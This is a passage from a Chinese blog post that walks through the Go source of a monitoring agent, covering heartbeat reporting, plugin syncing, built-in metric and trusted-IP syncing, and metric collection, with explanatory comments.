class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">go</span> reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reportAgentStatus</span><span class="params">(interval time.Duration)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">hostname = fmt.Sprintf(<span class="string">"error:%s"</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentReportRequest&#123;</span><br><span class="line">Hostname:      hostname,</span><br><span class="line">IP:            g.IP(),</span><br><span class="line">AgentVersion:  g.VersionMsg(),</span><br><span class="line">PluginVersion: g.GetCurrPluginVersion(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.SimpleRpcResponse</span><br><span class="line">        <span class="comment">// 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.ReportStatus"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.Code != <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Agent.ReportStatus fail:"</span>, err, <span class="string">"Request:"</span>, req, <span class="string">"Response:"</span>, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(interval)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的SyncMinPlugins函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncMinePlugins</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Plugin.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Heartbeat.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> syncMinePlugins()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数syncMinePlugins：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncMinePlugins</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">timestamp  <span class="keyword">int64</span> = <span class="number">-1</span></span><br><span class="line">pluginDirs []<span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentHeartbeatRequest&#123;</span><br><span class="line">Hostname: hostname,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.AgentPluginsResponse</span><br><span class="line">        <span class="comment">// hbs rpc接口MinePlugins，用来获取MinePlugin插件信息</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.MinePlugins"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Agent.MinePlugin fail:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Timestamp &lt;= timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pluginDirs = resp.Plugins</span><br><span class="line">timestamp = resp.Timestamp</span><br><span class="line"><span class="comment">// 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。</span></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"call Agent.MinePlugin:%v\n"</span>, resp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pluginDirs) == <span class="number">0</span> &#123;</span><br><span class="line">plugins.ClearAllPlugins()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desiredAll := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*plugins.Plugin)</span><br><span class="line">filefmt_scripts := [][]<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">dirfmt_scripts := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, script_path := <span class="keyword">range</span> pluginDirs &#123;</span><br><span class="line"><span class="comment">//script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS</span></span><br><span class="line"><span class="comment">//比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp</span></span><br><span class="line"><span class="comment">//1. 参数只对单个脚本文件生效，目录不支持参数</span></span><br><span class="line"><span class="comment">//2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行</span></span><br><span class="line"><span class="keyword">var</span> args <span class="keyword">string</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">re := regexp.MustCompile(<span class="string">`(.*)\((.*)\)`</span>)</span><br><span class="line">path_args := re.FindAllStringSubmatch(script_path, <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">if</span> path_args != <span class="literal">nil</span> &#123;</span><br><span class="line">script_path = path_args[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">args = path_args[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abs_path := filepath.Join(g.Config().Plugin.Dir, script_path)</span><br><span class="line"><span class="keyword">if</span> !file.IsExist(abs_path) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> file.IsFile(abs_path) &#123;</span><br><span class="line">filefmt_scripts = <span class="built_in">append</span>(filefmt_scripts, []<span class="keyword">string</span>&#123;script_path, args&#125;)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dirfmt_scripts = <span class="built_in">append</span>(dirfmt_scripts, script_path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">taken := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">for</span> _, script_file := <span class="keyword">range</span> filefmt_scripts &#123;</span><br><span class="line">abs_path := filepath.Join(g.Config().Plugin.Dir, script_file[<span class="number">0</span>])</span><br><span class="line">_, file_name := filepath.Split(abs_path)</span><br><span class="line">arr := strings.Split(file_name, <span class="string">"_"</span>)</span><br><span class="line"><span class="keyword">var</span> cycle <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">cycle, err = strconv.Atoi(arr[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fi, _ := os.Stat(abs_path)</span><br><span class="line">plugin := &amp;plugins.Plugin&#123;FilePath: script_file[<span class="number">0</span>], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[<span class="number">1</span>]&#125;</span><br><span class="line">desiredAll[script_file[<span class="number">0</span>]+<span class="string">"("</span>+script_file[<span class="number">1</span>]+<span class="string">")"</span>] = plugin</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件</span></span><br><span class="line">taken[script_file[<span class="number">0</span>]] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, script_path := <span class="keyword">range</span> dirfmt_scripts &#123;</span><br><span class="line">ps := plugins.ListPlugins(strings.Trim(script_path, <span class="string">"/"</span>))</span><br><span class="line"><span class="keyword">for</span> k, p := <span class="keyword">range</span> ps &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := taken[k]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">desiredAll[k] = p</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plugins.DelNoUsePlugins(desiredAll)</span><br><span class="line">plugins.AddNewPlugins(desiredAll)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"current plugins:%v\n"</span>, plugins.Plugins)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面需要获取监控端口和路径：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncBuiltinMetrics</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">go</span> syncBuiltinMetrics()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncBuiltinMetrics</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timestamp <span class="keyword">int64</span> = <span class="number">-1</span></span><br><span class="line"><span class="keyword">var</span> checksum <span class="keyword">string</span> = <span class="string">"nil"</span></span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ports = []<span class="keyword">int64</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> paths = []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> procs = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">var</span> urls = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentHeartbeatRequest&#123;</span><br><span class="line">Hostname: hostname,</span><br><span class="line">Checksum: checksum,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.BuiltinMetricResponse</span><br><span class="line">        <span class="comment">// 调用rpc接口获取监控端口和路径</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.BuiltinMetrics"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"ERROR:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Timestamp &lt;= timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Checksum == checksum &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timestamp = resp.Timestamp</span><br><span class="line">checksum = resp.Checksum</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, metric := <span class="keyword">range</span> resp.Metrics &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.URL_CHECK_HEALTH &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">","</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">url := strings.Split(arr[<span class="number">0</span>], <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(url) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">stime := strings.Split(arr[<span class="number">1</span>], <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(stime) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := strconv.ParseInt(stime[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">urls[url[<span class="number">1</span>]] = stime[<span class="number">1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"metric ParseInt timeout failed:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.NET_PORT_LISTEN &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> port, err := strconv.ParseInt(arr[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">ports = <span class="built_in">append</span>(ports, port)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"metrics ParseInt failed:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.DU_BS &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">paths = <span class="built_in">append</span>(paths, strings.TrimSpace(arr[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.PROC_NUM &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">","</span>)</span><br><span class="line"></span><br><span class="line">tmpMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(arr); i++ &#123;</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(arr[i], <span class="string">"name="</span>) &#123;</span><br><span class="line">tmpMap[<span class="number">1</span>] = strings.TrimSpace(arr[i][<span class="number">5</span>:])</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.HasPrefix(arr[i], <span class="string">"cmdline="</span>) &#123;</span><br><span class="line">tmpMap[<span class="number">2</span>] = strings.TrimSpace(arr[i][<span class="number">8</span>:])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">procs[metric.Tags] = tmpMap</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.SetReportUrls(urls)</span><br><span class="line">g.SetReportPorts(ports)</span><br><span class="line">g.SetReportProcs(procs)</span><br><span class="line">g.SetDuPaths(paths)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取信任IP列表：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncTrustableIps</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ips <span class="keyword">string</span></span><br><span class="line">        <span class="comment">// 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/</span></span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Agent.TrustableIps"</span>, model.NullRpcRequest&#123;&#125;, &amp;ips)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"ERROR: call Agent.TrustableIps fail"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.SetTrustableIps(ips)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收集指标数据collector</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Collect</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Transfer.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(g.Config().Transfer.Addrs) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> funcs.Mappers &#123;</span><br><span class="line"><span class="keyword">go</span> collect(<span class="keyword">int64</span>(v.Interval), v.Fs)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数collect</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">collect</span><span class="params">(sec <span class="keyword">int64</span>, fns []<span class="keyword">func</span>()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span>)</span> &#123;</span><br><span class="line">t := time.NewTicker(time.Second * time.Duration(sec))</span><br><span class="line"><span class="keyword">defer</span> t.Stop()</span><br><span class="line">    <span class="comment">// 根据获取到的map的指标的数组，去抓取数据</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&lt;-t.C</span><br><span class="line"><span class="comment">// hostname</span></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mvs := []*model.MetricValue&#123;&#125;</span><br><span class="line">         <span class="comment">// 获取忽略指标</span></span><br><span class="line">ignoreMetrics := g.Config().IgnoreMetrics</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, fn := <span class="keyword">range</span> fns &#123;</span><br><span class="line">items := fn()</span><br><span class="line"><span class="keyword">if</span> items == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, mv := <span class="keyword">range</span> items &#123;</span><br><span class="line"><span class="keyword">if</span> b, ok := ignoreMetrics[mv.Metric]; ok &amp;&amp; b &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mvs = <span class="built_in">append</span>(mvs, mv)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="built_in">len</span>(mvs); j++ &#123;</span><br><span class="line">mvs[j].Step = sec</span><br><span class="line">mvs[j].Endpoint = hostname</span><br><span class="line">mvs[j].Timestamp = now</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送数据到transfer</span></span><br><span class="line">g.SendToTransfer(mvs)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据发送函数SendToTransfer：</p><figure class="highlight 